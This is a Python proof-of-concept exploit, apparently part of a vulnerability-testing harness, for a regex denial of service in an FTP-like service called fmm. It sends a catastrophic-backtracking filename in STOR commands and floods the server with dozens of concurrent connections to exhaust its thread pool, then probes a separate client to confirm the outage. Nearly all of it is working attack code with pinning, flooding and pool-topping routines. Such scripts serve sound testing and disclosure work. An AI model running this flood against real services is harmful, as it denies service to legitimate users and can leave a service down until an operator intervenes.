#!/usr/bin/env python3
r"""
PoC #7: ReDoS in filename validation, chained with #8 into a whole-module
outage
------------------------------------------------------------------------
is_valid_filename() (fmm.cpp) matches uploaded filenames against
    ^([a-zA-Z0-9_]+)+\.[a-zA-Z0-9]+$
The nested quantifier ([a-zA-Z0-9_]+)+ makes std::regex backtrack
catastrophically on a run of allowed characters that never reaches a trailing
".ext". Past ~25 chars the blowup is effectively infinite: the worker thread
handling that STOR is pinned at 100% CPU in regex_match() forever -- and
because it is stuck in CPU, closing the client socket does NOT free it (the
thread never returns to recv()).

WHY ONE STOR IS NOT A DoS (the false-positive trap). fmm is
thread-per-connection, so a single pinned regex thread hangs only itself. On
the capped container (cpus=1.0) even that pinned thread is preemptively
time-sliced, so a normal I/O-bound client's login+PASV+RETR sails through in
milliseconds. Inferring "DoS" from the fact that YOUR OWN evil STOR never
returns proves nothing -- by the scoring contract, hanging your own connection
costs the team nothing. Phase 1 below demonstrates exactly this: it pins one
thread, then shows a separate bystander is unaffected.

WHAT MAKES IT SCOREABLE (chaining with #8). The accept loop spawns an
UNCAPPED std::thread per connection (vuln #8), with no per-connection timeout.
Hold enough evil-STOR connections open and the process/container thread (pid)
budget is exhausted -- each connection ties up a server thread (a few wedged in
regex_match() burning CPU, the rest starved behind them mid-handshake since
cpus=1.0). Once the pool is full, fmm stops accepting new connections (or
crashes when std::thread throws on pthread_create EAGAIN), and EVERY other
client is locked out. The refusal point tracks the container's pid cap
(pids_limit in vuln_tests/docker-compose.yml), which is what proves this is
thread/pid exhaustion and not merely the 16-deep listen backlog. The outage
lasts as long as the attacker sustains the flood; it lifts once the pool drains
(the starved threads free when their sockets close; a residual handful stay
pinned in regex but a few CPU-hogs alone don't deny an I/O-bound client -- see
phase 1). Note the shipped ota-agent.sh supervisor does NOT respawn a crashed
service, so if the cap is hit hard enough to trip std::terminate, that outage
does stand until an operator intervenes.

CONFIRMATION IS BY LIVENESS / BYSTANDER IMPACT. Phase 2 baselines a separate
normal client, floods evil-STOR connections until fmm refuses new ones, and
re-probes the bystander (keeping the pool topped up): the DoS is confirmed only
if that separate client is now DENIED. If the bystander keeps getting served,
this prints "not a full DoS" and exits 1.

WARNING: genuinely denies service to the target while it runs. Run it against a
throwaway instance.

Run fmm first, then:  python3 07_redos.py [host] [port]
"""
import socket
import sys
import threading
import time

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 2121

# A run of 'a's with no ".ext" -> catastrophic backtracking. ~48 chars is far
# past the point where the blowup exceeds any wall-clock timeout (a few bytes,
# not a memory bomb: this is a CPU/thread DoS).
EVIL = "a" * 48 + "!"
# A catastrophic backtrack never returns within any wall-clock window, so 3s is
# ample to tell "pinned in regex" from a fast reply (was 6s — pure dead wait).
PIN_WAIT = 3             # a reply within this => NOT catastrophic; we expect silence
BYS_USER, BYS_PASS = "bob", "hunter2"
RETR_FILE = "welcome.txt"

MAX_FLOOD = 400
# The flood must actually PIN close to the container's pid cap (100) for the
# pool to be exhausted enough to deny a bystander — a burst of one-shot openers
# is too lossy (refused connects pin nothing). Instead a fixed set of workers
# hammers concurrently, retrying on refusal, accumulating successfully-pinned
# threads up to TARGET_PINNED or until FLOOD_BUDGET elapses. Parallelism (vs. the
# old one-at-a-time loop) is what gets us to the cap in a few seconds on the
# 1-CPU, CPU-starved server instead of ~13s.
TARGET_PINNED = 95       # ~ the pid cap; enough pinned threads to wedge the pool
FLOOD_WORKERS = 48       # concurrent openers hammering the accept loop
FLOOD_BUDGET = 9         # wall-clock cap on the fill phase
# The bystander probes below run CONCURRENTLY (a real pool-exhaustion DoS denies
# them all at once), so PROBES probes cost ONE timeout window, not PROBES of
# them — the old sequential loop spent up to PROBES * 5s here.
PROBES = 3
PROBE_TIMEOUT = 4        # a healthy login+PASV+RETR is well under a second
PROBE_CONFIRM = 2        # majority of PROBES denied => shared-service DoS


def recv_reply(s, timeout=5):
    s.settimeout(timeout)
    try:
        return s.recv(4096).decode(errors="replace")
    except OSError:
        return ""


def bystander_retr(timeout=5):
    """Separate normal client: login -> PASV -> data conn -> RETR a real file.
    Returns (ok, detail, seconds)."""
    t0 = time.time()
    try:
        s = socket.create_connection((HOST, PORT), timeout=timeout)
        s.settimeout(timeout)
        s.recv(4096)
        s.sendall(f"USER {BYS_USER}\n".encode()); recv_reply(s, timeout)
        s.sendall(f"PASS {BYS_PASS}\n".encode())
        if "230" not in recv_reply(s, timeout):
            s.close(); return (False, "login-failed", time.time() - t0)
        s.sendall(b"PASV\n")
        pasv = recv_reply(s, timeout)
        if "227" not in pasv:
            s.close(); return (False, "no-PASV", time.time() - t0)
        nums = pasv[pasv.find("(") + 1:pasv.find(")")].split(",")
        dport = (int(nums[4]) << 8) | int(nums[5])
        d = socket.create_connection((HOST, dport), timeout=timeout)
        s.sendall(f"RETR {RETR_FILE}\n".encode()); recv_reply(s, timeout)
        d.settimeout(timeout)
        body = d.recv(4096); d.close(); s.close()
        return (len(body) > 0, f"RETR {len(body)}B", time.time() - t0)
    except Exception as e:
        return (False, type(e).__name__, time.time() - t0)


held = []
held_lock = threading.Lock()
keep_topping = threading.Event()


BANNER_TIMEOUT = 1.0     # a healthy server greets instantly; a stalled banner
                         # means the CPU-pinned pool can't serve new connections


def pin_one(timeout=2):
    """Pipeline login + one evil STOR in a single write so the server needs no
    client round-trips to reach is_valid_filename(); the thread then wedges in
    regex_match(). Socket is kept open (closing wouldn't free the thread anyway
    -- it is stuck in CPU, not in recv()).

    The banner read uses a short, fixed timeout: because #7 pins threads in CPU
    (not in recv()), a saturated server can no longer emit the greeting, so a
    stalled banner is itself the saturation signal — it raises socket.timeout
    (an OSError), which the flood loop counts toward REFUSE_STREAK. Waiting the
    full connect timeout for every late connection is what made this PoC take
    ~20s; capping the banner wait keeps the whole flood bounded."""
    s = socket.create_connection((HOST, PORT), timeout=timeout)
    s.settimeout(BANNER_TIMEOUT)
    s.recv(4096)  # banner (raises socket.timeout -> OSError once the pool is pinned)
    s.sendall(b"USER alice\nPASS password123\nSTOR " + EVIL.encode() + b"\n")
    return s


def topper():
    while keep_topping.is_set():
        try:
            s = pin_one(timeout=3)
            with held_lock:
                held.append(s)
        except OSError:
            time.sleep(0.05)


def phase1():
    """Pin one evil-STOR thread and report whether the regex catastrophically
    backtracks. Returns True if the thread is pinned in regex_match() (the vuln
    is present), False if the STOR returned promptly (the ReDoS regex is fixed).

    The returned signal is the PoC's verdict driver: the whole #7->#8 chain
    amplifies ONLY because a thread pinned in CPU cannot be freed by closing or
    evicting its socket (it never returns to recv()). Once the regex is fixed,
    an evil STOR replies immediately, the thread goes back to recv(), and the
    server's connection cap / idle timeout reclaim it like any idle socket. The
    residual plain connection-hold is vuln #8's territory (scored by its own
    PoC), not #7's -- so a fixed regex is, by itself, #7 FIXED."""
    print("=== Phase 1: the regex pins one thread, but that alone is not a DoS ===")
    pinned = False
    try:
        s = socket.create_connection((HOST, PORT), timeout=5); s.settimeout(5)
        s.recv(4096)
        s.sendall(b"USER alice\nPASS password123\n"); s.recv(4096); s.recv(4096)
        s.sendall(f"STOR {EVIL}\n".encode())
        s.settimeout(PIN_WAIT)
        try:
            r = s.recv(4096)
            print(f"[-] STOR replied ({r[:40]!r}) within {PIN_WAIT}s -- the regex "
                  "did NOT catastrophically backtrack; the pattern is fixed.")
        except socket.timeout:
            pinned = True
            print(f"[+] STOR got NO reply in {PIN_WAIT}s -- the server thread is "
                  "pinned in regex_match() (catastrophic backtracking).")
        # Bystander is unaffected by a single pinned thread:
        ok, detail, secs = bystander_retr()
        print(f"[*] Meanwhile a separate bystander login+PASV+RETR: "
              f"{'OK' if ok else 'DENIED'} in {secs:.2f}s ({detail}) -- one pinned "
              "thread is self-inflicted, NOT a shared-service DoS. Chaining with "
              "#8 (below) is what denies other clients.")
        # leave s open (pinned); it counts toward exhaustion in phase 2
        with held_lock:
            held.append(s)
    except OSError as e:
        print(f"[!] Phase 1 setup failed: {e}")
    return pinned


def main():
    ok, detail, secs = bystander_retr()
    if not ok:
        print(f"[!] Baseline bystander failed ({detail}); is fmm up and healthy?")
        sys.exit(2)
    print(f"[*] Baseline: bystander login+PASV+RETR OK in {secs:.2f}s ({detail})\n")

    pinned = phase1()

    # Verdict gate: the #7->#8 amplification depends on the regex pinning threads
    # in CPU (a pinned thread can't be freed by closing/evicting its socket). If
    # Phase 1 shows the regex is fixed (prompt STOR reply, no backtracking), the
    # chain is broken -- evil STORs become ordinary idle sockets that the
    # server's connection cap + idle timeout reclaim. Phase 2's connection-hold
    # test would then only be exercising vuln #8 (scored separately), so against
    # a fixed regex it can misread an expected, survivable flood as a DoS,
    # especially on a fast host where the flood overshoots. Treat a fixed regex
    # as #7 FIXED and stop here.
    if not pinned:
        _drain()
        print("\n[+] ReDoS regex is fixed: evil STORs return immediately instead "
              "of pinning threads in regex_match(), so the #7->#8 chain cannot "
              "amplify a connection flood into a shared-service outage. FIXED.")
        sys.exit(1)

    print("\n=== Phase 2: flood evil STORs to exhaust the thread/pid pool ===")
    print("[*] Firing evil-STOR connections (each permanently pins a CPU thread) "
          "until fmm refuses new connections...")
    # Hammer the accept loop with FLOOD_WORKERS concurrent openers that retry on
    # refusal, accumulating successfully-PINNED threads (not just attempts) up to
    # TARGET_PINNED or until FLOOD_BUDGET elapses. Opening one at a time made each
    # late connection wait on a progressively CPU-starved banner (~13s to the pid
    # cap); parallel pressure reaches it in a few seconds.
    stop_flood = threading.Event()
    refused = [0]

    def flood_worker():
        while not stop_flood.is_set():
            try:
                s = pin_one(timeout=2)
                with held_lock:
                    held.append(s)
                    n = len(held)
                if n >= TARGET_PINNED:
                    stop_flood.set()
            except OSError:
                refused[0] += 1

    workers = [threading.Thread(target=flood_worker, daemon=True)
               for _ in range(FLOOD_WORKERS)]
    for w in workers:
        w.start()
    deadline = time.time() + FLOOD_BUDGET
    while not stop_flood.is_set() and time.time() < deadline:
        time.sleep(0.1)
    stop_flood.set()
    for w in workers:
        w.join(3)
    # The pool is exhausted enough to test only if we pinned close to the cap.
    if len(held) < TARGET_PINNED // 2:
        print(f"[-] Only pinned {len(held)} threads in {FLOOD_BUDGET}s "
              f"({refused[0]} refused); the pid cap was not approached "
              "(raise FLOOD_WORKERS/FLOOD_BUDGET or check the pid cap). Not confirmed.")
        _drain(); sys.exit(1)
    print(f"[*] Pinned {len(held)} CPU threads ({refused[0]} opens refused by the "
          "exhausted pid pool). Probing a SEPARATE client while the flood is held...")

    keep_topping.set()
    threading.Thread(target=topper, daemon=True).start()
    # Probe concurrently: a shared-service DoS denies every client at once, so we
    # pay one PROBE_TIMEOUT window instead of PROBES sequential ones.
    presults = [None] * PROBES

    def probe(idx):
        presults[idx] = bystander_retr(timeout=PROBE_TIMEOUT)

    pthreads = [threading.Thread(target=probe, args=(i,), daemon=True)
                for i in range(PROBES)]
    for t in pthreads:
        t.start()
    for t in pthreads:
        t.join(PROBE_TIMEOUT + 2)
    denied = 0
    for i in range(PROBES):
        res = presults[i]
        if res is None:
            denied += 1
            print(f"[*]   bystander probe {i+1}/{PROBES}: DENIED (no return within window)")
            continue
        ok, detail, secs = res
        print(f"[*]   bystander probe {i+1}/{PROBES}: "
              f"{'OK' if ok else 'DENIED'} after {secs:.2f}s ({detail})")
        if not ok:
            denied += 1
    keep_topping.clear()

    # Recovery: the starved-mid-handshake threads free when their sockets
    # close, so the pool drains and service returns (a residual handful stay
    # pinned in regex but don't deny an I/O-bound client). If the cap was hit
    # hard enough to trip std::terminate instead, the outage stands (ota-agent
    # does not respawn) and this probe stays down.
    print("[*] Releasing the attacker's sockets and letting the pool drain...")
    _drain()
    time.sleep(1.5)
    rok, rdetail, rsecs = bystander_retr()
    note = ("pool drained, service back"
            if rok else "still down (cap likely tripped std::terminate; "
            "ota-agent does not respawn)")
    print(f"[*] Post-release probe: {'recovered' if rok else 'STILL DOWN'} "
          f"({rdetail}) -- {note}.")

    if denied > PROBES // 2:
        print(f"\n[+] ReDoS+#8 DoS confirmed -- a separate normal client was "
              f"DENIED {denied}/{PROBES} times while evil-STOR threads held the "
              f"thread/pid pool exhausted. One nested-quantifier regex, chained "
              f"with the uncapped accept loop, takes the whole module down for "
              f"every caller.")
        sys.exit(0)
    print(f"\n[-] Bystander denied only {denied}/{PROBES} times -- the pinned "
          "threads hung only the attacker's own connections. Not a full DoS. "
          "(Raise the flood or check the container's pid cap.)")
    sys.exit(1)


def _drain():
    with held_lock:
        socks = list(held)
        held.clear()
    for s in socks:
        try:
            s.close()
        except OSError:
            pass


if __name__ == "__main__":
    main()
